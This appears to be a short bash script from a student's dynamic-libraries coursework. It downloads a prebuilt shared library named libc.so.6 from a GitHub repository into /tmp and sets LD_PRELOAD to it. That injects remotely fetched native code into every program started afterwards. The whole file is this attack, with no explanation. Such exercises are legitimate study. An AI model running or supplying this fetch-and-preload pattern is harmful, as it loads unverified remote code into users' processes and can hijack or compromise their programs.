#!/bin/bash
wget -qP /tmp "https://github.com/sbe4658/alx-low_level_programming/raw/main/0x18-dynamic_libraries/code_injection/libc.so.6"
export LD_PRELOAD="/tmp/libc.so.6"
echo $LD_PRELOAD
